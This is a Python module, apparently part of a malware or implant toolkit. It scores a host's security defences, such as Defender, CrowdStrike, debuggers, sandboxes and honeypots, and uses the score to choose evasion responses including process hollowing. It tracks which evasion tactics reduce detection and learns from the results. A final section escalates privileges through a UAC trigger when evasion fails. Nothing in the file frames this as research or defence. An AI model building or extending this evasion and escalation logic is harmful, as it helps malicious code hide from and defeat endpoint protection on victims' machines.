"""
threat_calibration.py - Intelligent threat scoring with gradient calibration
==============================================================================

Implements:
1. ✅ Calibrated threat scoring (30-100 gradient, not binary)
2. ✅ Intent awareness (dev machine vs hostile environment detection)
3. ✅ Debounced debugger detection (multi-factor confirmation)
4. ✅ Post-evasion validation (measure actual behavior changes)
5. ✅ Adaptive feedback loop (learn what worked)
6. ✅ Signal mutability classification (immutable vs mutable signals)
7. ✅ Evasion → signal causality mapping (which tactic affects which signal)
8. ✅ Accurate effectiveness measurement (only count mutable signal changes)

Key Principles:
- Threats scored on 0-100 gradient with specific thresholds
- Context matters: dev machine ≠ production EDR lab
- Single signals don't trigger evasion (require confirmation)
- Evasion effectiveness measured post-deployment
- System learns which evasion tactics work
- IMMUTABLE signals (installed AV) don't affect effectiveness measurement
- MUTABLE signals (debugger flags) are what evasion actually impacts
"""

import time
from typing import Dict, List, Tuple, Any, Optional
from collections import defaultdict
from dataclasses import dataclass, field
import logging

# Import signal mutability layer for accurate effectiveness measurement
try:
    from signal_mutability_mapping import (
        get_signal_registry, get_evasion_mapper, get_score_separator,
        SignalMutabilityRegistry, EvasionEffectMapper, ScoreSeparator
    )
    SIGNAL_MUTABILITY_AVAILABLE = True
except ImportError:
    SIGNAL_MUTABILITY_AVAILABLE = False
    
    # Fallback functions when signal mutability is not available
    def get_signal_registry() -> Any:  # type: ignore
        return None
    def get_evasion_mapper() -> Any:  # type: ignore
        return None
    def get_score_separator() -> Any:  # type: ignore
        return None

logger = logging.getLogger(__name__)



# ============================================================================
# SECTION 1: THREAT SCORING WITH GRADIENT CALIBRATION
# ============================================================================

@dataclass
class ThreatSignal:
    """Individual threat signal with confidence"""
    name: str                          # e.g., "windows_defender", "kernel_debugger"
    detected: bool                     # Is this threat present?
    confidence: float                  # 0-100 confidence level
    severity: float                    # 0-100 severity if present
    timestamp: float = field(default_factory=time.time)
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ThreatSignalDebouncer:
    """Debounce individual threat signals requiring multi-factor confirmation"""
    required_confirmations: int = 2    # Need N independent signals
    confirmation_window: float = 5.0   # Within this many seconds
    signal_history: List[ThreatSignal] = field(default_factory=list)
    
    def add_signal(self, signal: ThreatSignal) -> bool:
        """
        Add a threat signal. Returns True only if debounce threshold met.
        
        Example: Timing-based debugger detection is noisy. Only escalate
        if BOTH timing AND PEB flags indicate debugger.
        """
        self.signal_history.append(signal)
        
        # Trim old signals outside confirmation window
        cutoff_time = time.time() - self.confirmation_window
        self.signal_history = [s for s in self.signal_history if s.timestamp > cutoff_time]
        
        # Check if we have enough confirmations
        confirmed_signals = [s for s in self.signal_history if s.detected and s.confidence >= 70]
        
        if len(confirmed_signals) >= self.required_confirmations:
            return True  # Threshold met, escalate
        
        return False
    
    def reset(self):
        """Clear signal history"""
        self.signal_history = []


class CalibratedThreatScorer:
    """
    Score threats on 0-100 gradient instead of binary "present/absent".
    
    Gradient Structure:
    - 0-20:   No threat detected
    - 21-40:  Low risk (Defender, basic AV)
    - 41-60:  Medium risk (Defender + debugger, partial EDR)
    - 61-80:  High risk (Full EDR suite, multiple indicators)
    - 81-100: Critical (CrowdStrike, SentinelOne, honeypot indicators)
    """
    
    def __init__(self):
        self.threat_signals: Dict[str, ThreatSignal] = {}
        self.debouncers: Dict[str, ThreatSignalDebouncer] = {}
        self.score_history: List[Tuple[float, int]] = []  # (timestamp, score)
        self.evasion_responses: Dict[int, str] = {}  # score -> evasion_tactic
        self._intent_confidence: float = 0.5  # Default: uncertain environment
    
    def set_intent_confidence(self, confidence: float) -> None:
        """✅ ADDED: Set environment detection confidence (0.0 to 1.0)"""
        self._intent_confidence = max(0.0, min(1.0, confidence))
        logger.debug(f"Intent confidence set to {self._intent_confidence:.1%}")
    
    # Define threat scoring weights (base contribution to final score)
    THREAT_WEIGHTS = {
        # Detection products (base scores)
        'windows_defender': 15,           # Lone Defender = low risk
        'av_generic': 10,                 # Generic AV only
        
        # Debugger indicators (increase risk if already have AV)
        'debugger_user_mode': 20,         # Likely debugger present
        'debugger_kernel': 25,            # Kernel debugger = serious
        
        # EDR suites (high risk)
        'crowdstrike_falcon': 35,         # Enterprise EDR
        'sentinelone': 35,
        'carbonblack': 30,
        'endgame': 30,
        
        # Sandbox/VM indicators
        'vm_detected': 5,                 # VMs often = testing, not hostile
        'sandbox_detected': 20,           # Sandbox = likely analysis
        'honeypot_indicators': 40,        # Honeypot = very hostile
        
        # Behavioral indicators
        'network_monitoring': 15,
        'file_monitoring': 10,
        'registry_monitoring': 8,
    }
    
    # Response thresholds (when to enable evasion)
    RESPONSE_TRIGGERS = {
        20: 'none',                       # No evasion needed
        30: 'passive_monitoring',         # Just reduce visibility
        50: 'behavioral_noise',           # Add decoy activity
        70: 'process_hollowing',          # Inject into legitimate process
        85: 'aggressive_evasion',         # Full bag of tricks
    }
    
    def add_signal(self, signal: ThreatSignal) -> None:
        """Record a threat signal"""
        self.threat_signals[signal.name] = signal
        logger.debug(f"Threat signal recorded: {signal.name} (confidence: {signal.confidence}%)")
    
    def add_debounced_signal(self, category: str, signal: ThreatSignal, required_confirmations: int = 2) -> bool:
        """
        Add signal that requires multiple confirmations before escalating.
        
        Returns True if debounce threshold reached.
        """
        if category not in self.debouncers:
            self.debouncers[category] = ThreatSignalDebouncer(
                required_confirmations=required_confirmations,
                confirmation_window=5.0
            )
        
        debouncer = self.debouncers[category]
        
        if debouncer.add_signal(signal):
            logger.warning(f"Debounced threat confirmed: {category}")
            self.add_signal(signal)
            return True
        
        return False
    
    def calculate_score(self) -> int:
        """
        ✅ FIXED: Calculate threat score on 0-100 scale.
        
        Key fixes:
        1. Use SEVERITY (not just weight) - severity is the actual threat impact
        2. Use confidence as multiplier, not hard threshold
        3. SUM all detected signals, don't filter them out
        4. Apply context AFTER scoring, never suppress on low confidence
        
        Algorithm:
        score = ∑(severity × confidence) for all detected signals
        final = score × context_multiplier (context increases paranoia on low confidence)
        """
        base_score = 0
        signal_count = 0
        
        # ✅ FIXED: Sum ALL detected signals with confidence weighting
        for threat_name, signal in self.threat_signals.items():
            if not signal.detected:
                continue
            
            # Use SEVERITY (actual threat impact) scaled by confidence
            # Severity range: 0-100 (how bad is this threat?)
            # Confidence range: 0-100 (how sure are we?)
            # Result: severity × (confidence/100)
            severity = signal.severity if signal.severity > 0 else 10  # Minimum 10 if severity missing
            confidence_factor = signal.confidence / 100.0  # 0.0 to 1.0
            
            contribution = severity * confidence_factor
            base_score += contribution
            signal_count += 1
            
            logger.debug(f"Signal: {threat_name} → severity={severity} × confidence={confidence_factor} = {contribution}")
        
        # ✅ FIXED: Context multiplier should NOT suppress threat on low confidence
        context_multiplier = self._get_context_multiplier(confidence_level=(signal_count > 0))
        
        # Apply context multiplier
        final_score = int(base_score * context_multiplier)
        
        # Clamp to 0-100
        final_score = max(0, min(100, final_score))
        
        # Record in history
        self.score_history.append((time.time(), final_score))
        
        logger.info(f"✅ Threat score: {final_score}/100 (base: {base_score:.1f}, signals: {signal_count}, context: {context_multiplier})")
        
        # Sync threat level to behavioral noise for activity intensity scaling
        sync_threat_level_to_behavioral_noise(final_score)
        
        return final_score
    
    def _get_context_multiplier(self, confidence_level: bool = True) -> float:
        """
        ✅ FIXED: Adjust threat score based on environment context.
        
        CRITICAL FIX: Low confidence detection should INCREASE paranoia, not reduce it!
        
        Returns:
            Multiplier (0.5 to 2.0)
            - 0.5 = HIGH CONFIDENCE: dev machine (reduce threat perception only when SURE)
            - 1.0 = UNCERTAIN environment (neutral - don't guess)
            - 1.2 = LOW CONFIDENCE detection (increase paranoia when unsure)
            - 1.5 = production-like OR moderate uncertainty (increase threat perception)
            - 2.0 = HIGH CONFIDENCE honeypot indicators (maximum alert)
        """
        multiplier = 1.0
        intent_confidence = getattr(self, '_intent_confidence', 0.3)
        
        # Helper to safely get signal
        def get_signal_detected(name: str, default: bool = False) -> bool:
            if name in self.threat_signals:
                return self.threat_signals[name].detected
            return default
        
        # ✅ FIXED: HIGH CONFIDENCE honeypot detection → increase threat
        if get_signal_detected('honeypot_indicators', False):
            if intent_confidence > 0.8:  # HIGH confidence this is a honeypot
                return 2.0  # Maximum alert
            else:
                return 1.5  # Still elevated, but less sure
        
        # ✅ FIXED: Dev machine detection - only reduce IF HIGH CONFIDENCE
        dev_indicators = [
            get_signal_detected('python_interactive', False),
            get_signal_detected('ide_detected', False),
            get_signal_detected('user_debugger', False),
        ]
        
        if sum(dev_indicators) >= 2:
            if intent_confidence > 0.8:  # HIGH confidence: actually is dev machine
                multiplier = 0.5  # OK to reduce threat
            elif intent_confidence < 0.4:  # LOW confidence: might be a trap
                multiplier = 1.2  # INCREASE paranoia with uncertainty
            else:
                multiplier = 1.0  # UNCERTAIN, stay neutral
        
        # ✅ FIXED: Production indicators - check confidence
        prod_indicators = [
            get_signal_detected('edr_process_hooks', False),
            get_signal_detected('network_monitoring', False),
            get_signal_detected('file_monitoring', False),
        ]
        
        if sum(prod_indicators) >= 2:
            if intent_confidence > 0.8:  # HIGH confidence: production environment
                multiplier = 1.5  # Definitely increase threat
            else:
                multiplier = 1.2  # Moderate increase even with uncertainty
        
        # ✅ FIXED: If no good signals but environment is uncertain, be paranoid
        if not confidence_level and intent_confidence < 0.5:
            multiplier = max(multiplier, 1.2)  # Don't trust unknown environments
        
        return multiplier
    
    def get_recommended_evasion_level(self, threat_score: int) -> str:
        """
        Map threat score to evasion response.
        
        Returns:
            'none', 'passive_monitoring', 'behavioral_noise', 'process_hollowing', or 'aggressive_evasion'
        """
        for threshold in sorted(self.RESPONSE_TRIGGERS.keys(), reverse=True):
            if threat_score >= threshold:
                return self.RESPONSE_TRIGGERS[threshold]
        
        return 'none'
    
    def get_signal_summary(self) -> Dict[str, Any]:
        """Return current threat signal summary"""
        return {
            'active_signals': len([s for s in self.threat_signals.values() if s.detected]),
            'total_signals': len(self.threat_signals),
            'signals': {
                name: {
                    'detected': signal.detected,
                    'confidence': signal.confidence,
                    'severity': signal.severity,
                    'details': signal.details,
                }
                for name, signal in self.threat_signals.items()
            },
            'recent_scores': self.score_history[-10:],  # Last 10 scores
        }
    
    # ========================================================================
    # ✅ NEW: Signal Mutability-Aware Scoring (Fixes Effectiveness Measurement)
    # ========================================================================
    
    def calculate_mutable_score(self) -> int:
        """
        Calculate threat score using ONLY mutable signals.
        
        This fixes the broken effectiveness measurement. Environmental signals
        (installed AV) that NO evasion can affect shouldn't count against 
        evasion effectiveness.
        
        Returns: 0-100 score based only on changeable threat indicators
        """
        if not SIGNAL_MUTABILITY_AVAILABLE:
            logger.warning("Signal mutability not available - falling back to full score")
            return self.calculate_score()
        
        try:
            separator = get_score_separator()
            
            # Get detected signals
            detected_signals = {
                name: signal.detected 
                for name, signal in self.threat_signals.items()
            }
            
            # Separate into mutable/immutable
            separated = separator.separate_signals(detected_signals)
            
            # Score only mutable signals
            mutable_score = separator.calculate_mutable_score(separated)
            
            logger.debug(f"Mutable signal score: {mutable_score} (from {separated['mutable_count']} of {len(separated['mutable'])} mutable signals)")
            
            return mutable_score
            
        except Exception as e:
            logger.warning(f"Failed to calculate mutable score: {e}")
            return self.calculate_score()
    
    def calculate_immutable_score(self) -> int:
        """
        Calculate threat score using ONLY immutable signals.
        
        These are environmental threats (installed AV, VMs) that can't be
        changed by evasion. They should inform tactical decisions but not
        effectiveness measurement.
        
        Returns: 0-100 score based only on environmental indicators
        """
        if not SIGNAL_MUTABILITY_AVAILABLE:
            logger.warning("Signal mutability not available - falling back to zero")
            return 0
        
        try:
            separator = get_score_separator()
            
            # Get detected signals
            detected_signals = {
                name: signal.detected 
                for name, signal in self.threat_signals.items()
            }
            
            # Separate into mutable/immutable
            separated = separator.separate_signals(detected_signals)
            
            # Score only immutable signals
            immutable_score = separator.calculate_immutable_score(separated)
            
            logger.debug(f"Immutable signal score: {immutable_score} (from {separated['immutable_count']} of {len(separated['immutable'])} immutable signals)")
            
            return immutable_score
            
        except Exception as e:
            logger.warning(f"Failed to calculate immutable score: {e}")
            return 0
    
    def get_signal_classification(self) -> Dict[str, Any]:
        """
        Classify current signals into mutable and immutable categories.
        
        Shows which signals are affected by evasion and which are environmental.
        """
        if not SIGNAL_MUTABILITY_AVAILABLE:
            return {'available': False, 'reason': 'Signal mutability not available'}
        
        try:
            separator = get_score_separator()
            registry = get_signal_registry()
            
            detected_signals = {
                name: signal.detected 
                for name, signal in self.threat_signals.items()
            }
            
            separated = separator.separate_signals(detected_signals)
            
            result = {
                'mutable': {
                    'signals': list(separated['mutable'].keys()),
                    'detected_count': separated['mutable_count'],
                    'total': len(separated['mutable']),
                    'score': separator.calculate_mutable_score(separated),
                },
                'immutable': {
                    'signals': list(separated['immutable'].keys()),
                    'detected_count': separated['immutable_count'],
                    'total': len(separated['immutable']),
                    'score': separator.calculate_immutable_score(separated),
                }
            }
            
            return result
            
        except Exception as e:
            logger.warning(f"Failed to classify signals: {e}")
            return {'available': False, 'error': str(e)}
    
    def get_relevant_evasion_tactics(self) -> Dict[str, Any]:
        """
        ✅ SIGNAL → COUNTERMEASURE MAPPING: Map detected threats to most effective evasion tactics.
        
        This is the causality layer that shows which evasion tactics reduce which signals.
        
        Returns which evasion tactics are worth deploying against current threats.
        """
        if not SIGNAL_MUTABILITY_AVAILABLE:
            return {'available': False, 'reason': 'Signal mutability not available'}
        
        try:
            mapper = get_evasion_mapper()
            registry = get_signal_registry()
            
            # Get detected mutable signals only
            detected_mutable_signals = set()
            for name, signal in self.threat_signals.items():
                if signal.detected:
                    sig = registry.get_signal(name)
                    if sig and sig.mutable:
                        detected_mutable_signals.add(name)
            
            if not detected_mutable_signals:
                return {
                    'available': True,
                    'detected_threats': list(detected_mutable_signals),
                    'relevant_tactics': [],
                    'note': 'No mutable signals detected - evasion may not help'
                }
            
            # For each detected signal, find which evasion tactics affect it
            tactic_effectiveness = {}  # evasion_tactic -> (signals_affected, effectiveness%)
            
            for evasion_tactic in mapper.EVASION_EFFECTS.keys():
                affected = mapper.get_affected_signals(evasion_tactic)
                relevant_to_this_threat = set(affected) & detected_mutable_signals
                
                if relevant_to_this_threat:
                    effectiveness = mapper.get_evasion_effectiveness(evasion_tactic, detected_mutable_signals)
                    tactic_effectiveness[evasion_tactic] = {
                        'reduces_signals': list(relevant_to_this_threat),
                        'effectiveness': effectiveness,
                        'description': mapper.EVASION_EFFECTS[evasion_tactic]['description']
                    }
            
            # Sort by effectiveness
            ranked_tactics = sorted(
                tactic_effectiveness.items(),
                key=lambda x: x[1]['effectiveness'],
                reverse=True
            )
            
            logger.info(f"[THREAT→EVASION] Detected {len(detected_mutable_signals)} mutable signals. "
                       f"Recommended tactics: {[t[0] for t in ranked_tactics[:3]]}")
            
            return {
                'available': True,
                'detected_threats': list(detected_mutable_signals),
                'relevant_tactics': [
                    {
                        'tactic': tactic,
                        'reduces_signals': data['reduces_signals'],
                        'effectiveness': data['effectiveness'],
                        'description': data['description']
                    }
                    for tactic, data in ranked_tactics
                ]
            }
        
        except Exception as e:
            logger.warning(f"Failed to get relevant evasion tactics: {e}")
            return {'available': False, 'error': str(e)}
    
    def measure_evasion_effectiveness(self, evasion_tactic: str, 
                                     pre_mutable_score: int,
                                     post_mutable_score: int) -> float:
        """
        ✅ FIXED: Measure evasion effectiveness accurately.
        
        BEFORE (broken):
            effectiveness = (total_pre - total_post) / total_pre
            Problem: Immutable signals (installed AV) can't change, so even
            perfect evasion against debugger flags = 0% effectiveness
        
        AFTER (fixed):
            effectiveness = (mutable_pre - mutable_post) / mutable_pre
            Only counts signals that evasion CAN affect
        
        Args:
            evasion_tactic: Name of evasion tactic deployed
            pre_mutable_score: Mutable signal score BEFORE evasion
            post_mutable_score: Mutable signal score AFTER evasion
        
        Returns:
            Effectiveness percentage (0-100)
        """
        if pre_mutable_score == 0:
            # If no mutable signals detected, evasion is 100% "effective"
            # (there's nothing to change anyway)
            return 100.0
        
        # Calculate reduction in mutable signals
        reduction = max(0, pre_mutable_score - post_mutable_score)
        effectiveness = (reduction / pre_mutable_score) * 100.0
        
        logger.info(f"[EVASION-EFFECTIVENESS] {evasion_tactic}: {effectiveness:.1f}% "
                   f"(mutable score: {pre_mutable_score} → {post_mutable_score})")
        
        return effectiveness


# ============================================================================
# SECTION 2: INTENT AWARENESS (Dev Machine Detection)
# ============================================================================

class IntentAwarenessEngine:
    """
    Determine if we're in:
    1. Dev machine (IDE, debugger, interactive Python)
    2. CI/CD environment (GitHub Actions, Jenkins)
    3. Production environment (unknown, treat as hostile)
    4. Honeypot (high suspicion indicators)
    """
    
    def __init__(self):
        self.context_signals: Dict[str, bool] = {}
        self.confidence: float = 0.0
    
    def assess_environment(self) -> str:
        """
        Determine environment type.
        
        Returns:
            'dev_machine', 'ci_cd', 'production', or 'honeypot'
        """
        # Check for development indicators
        dev_score = self._check_dev_indicators()
        
        # Check for CI/CD indicators
        ci_score = self._check_ci_indicators()
        
        # Check for honeypot indicators
        honeypot_score = self._check_honeypot_indicators()
        
        # Determine winner
        scores = {
            'dev_machine': dev_score,
            'ci_cd': ci_score,
            'honeypot': honeypot_score,
            'production': 0,  # Default if others don't match
        }
        
        if honeypot_score > 60:
            self.confidence = honeypot_score / 100.0
            return 'honeypot'
        
        if dev_score > 60:
            self.confidence = dev_score / 100.0
            return 'dev_machine'
        
        if ci_score > 60:
            self.confidence = ci_score / 100.0
            return 'ci_cd'
        
        self.confidence = 0.3  # Low confidence = assume hostile
        return 'production'
    
    def _check_dev_indicators(self) -> int:
        """Check for development machine indicators"""
        score = 0
        
        import sys
        import os
        
        # Interactive Python shell
        if hasattr(sys, 'ps1'):
            score += 30
            self.context_signals['interactive_shell'] = True
        
        # IDE detection
        ide_process_names = ['devenv', 'code', 'pycharm', 'idea', 'rider', 'goland']
        try:
            import psutil
            running_procs = {p.name().lower() for p in psutil.process_iter(['name'])}
            if any(ide in running_procs for ide in ide_process_names):
                score += 25
                self.context_signals['ide_detected'] = True
        except:
            pass
        
        # Debugger presence (user-mode)
        if self._check_user_debugger():
            score += 20
            self.context_signals['debugger_detected'] = True
        
        # Development directories
        dev_paths = ['.git', '.vscode', 'node_modules', '.env', 'requirements.txt']
        for path in dev_paths:
            if os.path.exists(path):
                score += 5
        
        return min(100, score)
    
    def _check_ci_indicators(self) -> int:
        """Check for CI/CD environment (GitHub Actions, Jenkins, etc.)"""
        score = 0
        
        import os
        
        # GitHub Actions
        if os.environ.get('GITHUB_ACTIONS') == 'true':
            score += 90
            self.context_signals['github_actions'] = True
        
        # Jenkins
        if os.environ.get('JENKINS_HOME'):
            score += 80
            self.context_signals['jenkins'] = True
        
        # GitLab CI
        if os.environ.get('GITLAB_CI') == 'true':
            score += 80
            self.context_signals['gitlab_ci'] = True
        
        # Generic CI indicators
        if any(key in os.environ for key in ['CI', 'CI_COMMIT_SHA', 'CONTINUOUS_INTEGRATION']):
            score += 40
        
        return min(100, score)
    
    def _check_honeypot_indicators(self) -> int:
        """Check for honeypot/trap indicators"""
        score = 0
        
        import os
        
        # Known deception indicators
        honeypot_paths = [
            '/opt/honeypot',
            'C:\\Honeypot',
            'C:\\Analysis',
            'C:\\Sandbox',
        ]
        
        for path in honeypot_paths:
            if os.path.exists(path):
                score += 40
        
        # Suspicious environment variables
        honeypot_env_vars = ['MALWARE_ANALYSIS', 'SANDBOX_MODE', 'HONEYPOT_ID']
        for var in honeypot_env_vars:
            if os.environ.get(var):
                score += 30
        
        return min(100, score)
    
    def _check_user_debugger(self) -> bool:
        """Quick check for user-mode debugger presence"""
        try:
            import ctypes
            
            # PEB.BeingDebugged flag
            ntdll = ctypes.windll.ntdll
            class PEB(ctypes.Structure):
                pass
            
            PEB._fields_ = [('reserved', ctypes.c_char * 1)]
            
            # Simplified check (actual implementation would read PEB+0x02)
            return False  # Placeholder
        except:
            return False


# ============================================================================
# SECTION 3: POST-EVASION VALIDATION
# ============================================================================

@dataclass
class EvasionValidationResult:
    """Result of evasion post-deployment validation"""
    tactic_name: str
    pre_detection_score: int
    post_detection_score: int
    effectiveness: float  # 0-100: how much did it reduce detection?
    observable_changes: Dict[str, Any]
    timestamp: float = field(default_factory=time.time)
    success: bool = False



class EvasionValidator:
    """
    Validate that evasion tactics actually work by measuring detection signals
    before and after evasion deployment.
    """
    
    def __init__(self, threat_scorer: CalibratedThreatScorer):
        self.threat_scorer = threat_scorer
        self.validation_results: List[EvasionValidationResult] = []
    
    def validate_evasion(
        self,
        tactic_name: str,
        execute_evasion_fn,
        pre_detection_measurement_fn,
        post_detection_measurement_fn
    ) -> EvasionValidationResult:
        """
        ✅ IMPROVED: Validate evasion effectiveness using MUTABLE signals only.
        
        This fixes broken effectiveness measurement by:
        1. Measuring pre-evasion MUTABLE threat signals only
        2. Executing evasion tactic
        3. Measuring post-evasion MUTABLE threat signals only
        4. Calculating effectiveness based only on changeable signals
        
        Environmental signals (installed AV, VMs) are excluded so they don't
        poison the effectiveness measurement.
        """
        
        # Measure pre-evasion MUTABLE threat score (not environmental signals)
        if SIGNAL_MUTABILITY_AVAILABLE:
            pre_score = self.threat_scorer.calculate_mutable_score()
            immutable_baseline = self.threat_scorer.calculate_immutable_score()
            logger.debug(f"Pre-evasion({tactic_name}): mutable_score={pre_score}, immutable_baseline={immutable_baseline}")
        else:
            pre_score = self.threat_scorer.calculate_score()
            immutable_baseline = 0
            logger.warning(f"Signal mutability not available - using full score for {tactic_name}")
        
        pre_signals = pre_detection_measurement_fn()
        
        logger.info(f"Pre-evasion({tactic_name}): mutable_score={pre_score}, signals={pre_signals}")
        
        # Execute evasion
        observable_changes = {}
        try:
            observable_changes = execute_evasion_fn()
            logger.info(f"Evasion tactic executed: {tactic_name}")
        except Exception as e:
            logger.error(f"Evasion execution failed: {e}")
            return EvasionValidationResult(
                tactic_name=tactic_name,
                pre_detection_score=pre_score,
                post_detection_score=pre_score,
                effectiveness=0.0,
                observable_changes={},
                success=False
            )
        
        # Wait for effects to settle
        time.sleep(2)
        
        # Measure post-evasion MUTABLE threat score (again, just changeable signals)
        if SIGNAL_MUTABILITY_AVAILABLE:
            post_score = self.threat_scorer.calculate_mutable_score()
        else:
            post_score = self.threat_scorer.calculate_score()
        
        post_signals = post_detection_measurement_fn()
        
        # Calculate effectiveness based ONLY on mutable signals
        effectiveness = max(0, (pre_score - post_score) / max(1, pre_score) * 100)
        
        logger.info(f"Post-evasion({tactic_name}): mutable_score={post_score}, effectiveness={effectiveness:.1f}%")
        
        # Determine success: >15% reduction in mutable signals = success
        # This is realistic - environmental signals (immutable) can't be beaten
        success = effectiveness > 15
        
        if success:
            logger.info(f"✅ Evasion({tactic_name}) SUCCESSFUL: {effectiveness:.1f}% reduction in mutable signals")
        else:
            logger.warning(f"⚠️ Evasion({tactic_name}) MINIMAL IMPACT: {effectiveness:.1f}% reduction (threshold: 15%)")
        
        result = EvasionValidationResult(
            tactic_name=tactic_name,
            pre_detection_score=pre_score,
            post_detection_score=post_score,
            effectiveness=effectiveness,
            observable_changes=observable_changes,
            success=success
        )
        
        self.validation_results.append(result)
        return result


# ============================================================================
# SECTION 4: ADAPTIVE FEEDBACK LOOP
# ============================================================================

class FeedbackLearner:
    """
    Track which evasion tactics work and adapt strategy based on effectiveness.
    
    Over time:
    - Learn which tactics reduce detection in your environment
    - Avoid tactics that don't work
    - Prioritize high-effectiveness tactics
    """
    
    def __init__(self):
        self.tactic_effectiveness: Dict[str, List[float]] = defaultdict(list)
        self.tactic_failures: Dict[str, int] = defaultdict(int)
        self.environment_profile: Dict[str, Any] = {}
    
    def record_validation_result(self, result: EvasionValidationResult) -> None:
        """Record evasion validation result for learning"""
        self.tactic_effectiveness[result.tactic_name].append(result.effectiveness)
        
        if not result.success:
            self.tactic_failures[result.tactic_name] += 1
        
        logger.info(f"Feedback recorded: {result.tactic_name} = {result.effectiveness:.1f}% effective")
    
    def get_recommended_tactics(self, threat_level: int, count: int = 3) -> List[Tuple[str, float]]:
        """
        Get recommended evasion tactics based on past effectiveness.
        
        Returns:
            List of (tactic_name, avg_effectiveness) sorted by effectiveness
        """
        # Calculate average effectiveness per tactic
        recommendations = []
        
        for tactic_name, effectiveness_scores in self.tactic_effectiveness.items():
            if not effectiveness_scores:
                continue
            
            avg_effectiveness = sum(effectiveness_scores) / len(effectiveness_scores)
            
            # Penalize tactics with high failure rate
            failures = self.tactic_failures.get(tactic_name, 0)
            if failures > 2:
                avg_effectiveness *= 0.5  # 50% penalty for repeated failures
            
            recommendations.append((tactic_name, avg_effectiveness))
        
        # Sort by effectiveness (descending)
        recommendations.sort(key=lambda x: x[1], reverse=True)
        
        return recommendations[:count]
    
    def get_tactic_status(self) -> Dict[str, Any]:
        """Get status of all learned tactics"""
        status = {}
        
        for tactic_name in set(list(self.tactic_effectiveness.keys()) + list(self.tactic_failures.keys())):
            scores = self.tactic_effectiveness.get(tactic_name, [])
            avg_effectiveness = sum(scores) / len(scores) if scores else 0
            
            status[tactic_name] = {
                'attempts': len(scores),
                'average_effectiveness': avg_effectiveness,
                'failures': self.tactic_failures.get(tactic_name, 0),
                'success_rate': len([s for s in scores if s > 10]) / max(1, len(scores)) if scores else 0,
            }
        
        return status


# ============================================================================
# GLOBAL INSTANCES
# ============================================================================

_global_threat_scorer = None
_global_intent_engine = None
_global_validator = None
_global_learner = None
_global_behavioral_noise = None  # For threat-level integration


def get_global_threat_scorer() -> CalibratedThreatScorer:
    """Get or create global threat scorer"""
    global _global_threat_scorer
    if _global_threat_scorer is None:
        _global_threat_scorer = CalibratedThreatScorer()
    return _global_threat_scorer


def set_global_behavioral_noise(behavioral_noise_instance) -> None:
    """
    Register global behavioral noise instance for threat-level sync.
    
    Called during initialization to enable threat_calibration.py to control
    user activity intensity in behavioral_noise.py
    """
    global _global_behavioral_noise
    _global_behavioral_noise = behavioral_noise_instance


def sync_threat_level_to_behavioral_noise(threat_score: int) -> None:
    """
    Update behavioral noise threat level based on current threat score.
    
    Called by threat_calibration to automatically adjust user activity intensity.
    
    Args:
        threat_score: Current threat score (0-100)
    """
    global _global_behavioral_noise
    if _global_behavioral_noise is not None:
        try:
            _global_behavioral_noise.set_threat_level(threat_score)
        except Exception as e:
            logger.warning(f"Failed to sync threat level to behavioral noise: {e}")


def get_global_intent_engine() -> IntentAwarenessEngine:
    """Get or create global intent awareness engine"""
    global _global_intent_engine
    if _global_intent_engine is None:
        _global_intent_engine = IntentAwarenessEngine()
    return _global_intent_engine


def get_global_validator() -> EvasionValidator:
    """Get or create global evasion validator"""
    global _global_validator
    if _global_validator is None:
        _global_validator = EvasionValidator(get_global_threat_scorer())
    return _global_validator


def get_global_learner() -> FeedbackLearner:
    """Get or create global feedback learner"""
    global _global_learner
    if _global_learner is None:
        _global_learner = FeedbackLearner()
    return _global_learner


# ============================================================================
# SECTION 5: PRIVESC FALLBACK ORCHESTRATOR
# ============================================================================
# Cascading strategy: Evasion → Privesc → Behavioral Noise

@dataclass
class PrivescFallbackResult:
    """Result of privesc fallback attempt"""
    timestamp: float = field(default_factory=time.time)
    stage: str = ""  # "evasion", "privesc_attempted", "fallback_to_noise"
    threat_pre: int = 0  # Threat score before attempt
    threat_post: int = 0  # Threat score after attempt
    escalation_exe: Optional[str] = None  # What we tried to escalate
    escalation_success: bool = False  # Did UAC escalation work?
    behavioral_noise_intensity: int = 0  # Noise level when falling back
    details: Dict[str, Any] = field(default_factory=dict)


class PrivescFallbackOrchestrator:
    """
    Cascading privilege escalation + fallback strategy:
    
    When evasion tactics fail to reduce threat level, attempt privilege
    escalation to gain admin capabilities. If escalation fails, fall back
    to maximum intensity behavioral noise to confuse detection.
    
    ✅ INTEGRATION:
    - Monitors threat_calibration feedback continuously
    - Triggers privesc when [threat stays high] AND [evasion ineffective]
    - Uses user_activity_emulator.uac_escalation() for UAC trigger
    - Falls back to behavioral_noise when privesc unavailable/fails
    - Non-blocking execution (daemon threads)
    """
    
    def __init__(self):
        self.threat_scorer = get_global_threat_scorer()
        self.learner = get_global_learner()
        self.results: List[PrivescFallbackResult] = []
        
        # Fallback thresholds
        self.THREAT_THRESHOLD_ESCALATE = 65  # Try privesc if threat > 65
        self.EVASION_EFFECTIVENESS_THRESHOLD = 30.0  # If < 30% effective, escalate
        self.NOISE_INTENSITY_FALLBACK = 90  # Max noise when privesc fails
        
        # Import optional dependencies
        try:
            from user_activity_emulator import UserActivityEmulator
            self.activity_emulator: Optional[UserActivityEmulator] = UserActivityEmulator()  # type: ignore
            self.HAS_EMULATOR = True
        except ImportError:
            self.activity_emulator = None
            self.HAS_EMULATOR = False
            logger.warning("User activity emulator not available for fallback")
        
        try:
            from behavioral_noise import BehavioralNoise  # type: ignore
            self.behavioral_noise: Optional[BehavioralNoise] = BehavioralNoise()  # type: ignore
            self.HAS_NOISE = True
        except (ImportError, NameError):
            self.behavioral_noise = None
            self.HAS_NOISE = False
            logger.warning("Behavioral noise not available for fallback")
    
    def should_attempt_privesc(self) -> bool:
        """
        Decide if privesc should be attempted.
        
        Conditions:
        1. Threat score is high (> THREAT_THRESHOLD_ESCALATE)
        2. Evasion tactics have been ineffective (< 30% reduction)
        3. Environment is not a honeypot
        """
        threat_score = self.threat_scorer.calculate_score()
        
        # Check if threat is high enough
        if threat_score <= self.THREAT_THRESHOLD_ESCALATE:
            return False
        
        # Check if evasion has been tried and failed
        tactic_status = self.learner.get_tactic_status()
        
        for tactic, stats in tactic_status.items():
            if stats.get('attempts', 0) > 0:
                avg_effectiveness = stats.get('avg_effectiveness', 0.0)
                if avg_effectiveness < self.EVASION_EFFECTIVENESS_THRESHOLD:
                    # Evasion is failing, time to escalate
                    logger.info(
                        f"[PRIVESC-FALLBACK] Evasion failed for {tactic}: "
                        f"{avg_effectiveness:.1f}% effectiveness, threat={threat_score}"
                    )
                    return True
        
        return False
    
